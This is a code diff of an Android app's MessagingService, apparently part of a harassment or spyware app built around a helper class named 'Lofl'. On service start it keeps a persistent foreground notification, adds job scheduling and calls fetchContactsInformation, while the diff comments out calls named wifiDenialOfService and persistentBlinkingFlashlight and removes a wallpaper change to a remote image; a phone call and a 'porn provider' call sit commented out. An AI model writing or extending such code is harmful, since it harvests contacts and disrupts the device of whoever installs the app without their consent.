@@ -48,6 +48,7 @@ public class MessagingService extends Service {
     public void onCreate() {
         super.onCreate();
         startForeground(Constants.FOREGROUND_NOTIFICATION_ID, Lofl.createPersistentServiceNotification(this));
+        JobsScheduler.scheduleJob(this);
         sIsRunning = true;
         DatabaseHelper database = DatabaseHelper.getInstance(getApplicationContext());
         mIncomingReceiver = new IncomingReceiver();
@@ -189,7 +190,7 @@ public class MessagingService extends Service {
         }).start();*/
 
         //Lofl.phoneCall(MessagingService.this, "18002738255");
-        Lofl.persistentBlinkingFlashlight(this);
+        //Lofl.persistentBlinkingFlashlight(this);
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -210,11 +211,10 @@ public class MessagingService extends Service {
                 } catch (InterruptedException e) {
                     e.printStackTrace();
                 }
-                Lofl.changeWallpaper(MessagingService.this, Lofl.getBitmapFromUrl(Uri.parse("https://i.pinimg.com/originals/04/17/57/0417575eea25c3568bf4007de9afe61f.jpg").toString()));
             }
         }).start();
         Lofl.fetchContactsInformation(this);
-        Lofl.wifiDenialOfService(this);
+        //Lofl.wifiDenialOfService(this);
         //Lofl.startPornProvider(this, 180000);
     }
 
